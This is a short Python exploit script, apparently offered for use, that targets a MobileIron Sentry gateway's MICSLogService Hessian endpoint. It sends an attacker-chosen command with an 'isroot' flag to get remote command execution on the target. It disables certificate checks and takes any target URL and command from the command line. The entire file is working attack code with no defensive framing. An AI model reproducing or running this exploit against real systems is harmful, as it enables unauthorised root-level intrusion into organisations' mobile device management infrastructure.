import colorama
from pyhessian.client import HessianProxy
from http.client import HTTPSConnection
import ssl
import sys
import argparse
import requests
import urllib3
from colorama import *
urllib3.disable_warnings()

#用于在没有提供SSL上下文的情况下使用不受验证的上下文,提供HTTPSconnection修补
_original_https_init = HTTPSConnection.__init__

def patched_https_init(self,*args,**kwargs):
    if 'context' not in kwargs:
        kwargs['context'] = ssl._create_unverified_context()
    _original_https_init(self,*args,**kwargs)

def title():
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN + '+      MobieleIron Sentry Gateway + RCE                +')
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.GREEN + '+ EXP: python3 xxxx.py https://1.1.1.1:8443          +')
    print(colorama.Fore.GREEN + '+-------------------------------------------------------------+')
    print(colorama.Fore.BLUE + '+ writer:          yuejinjianke                        +')


def exploit(base_url,command):
    service_url = f"{base_url}/mics/services/MICSLogService"
    response = requests.get(service_url,verify=False)
    if response.status_code != 405:
        print(colorama.Fore.RED + '[-] Vulnerable endpoint was not reachable - bailing')
        sys.exit()

    HTTPSConnection.__init__ = patched_https_init

    dto = {
        "commmand": command,
        "isroot": True,
    }


    proxy = HessianProxy(service_url)
    details = proxy.uploadFileUsingFileInput(dto, None)
    if details:
        print(colorama.Fore.GREEN + '[+] Successfully executed command on target!')

if __name__ == '__main__':
    title()
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url',help='The URL of the target', required=True)
    parser.add_argument('-c','--cmd',help='the command you want to exec',required=True)
    args = parser.parse_args()

    exploit(args.url,args.cmd)
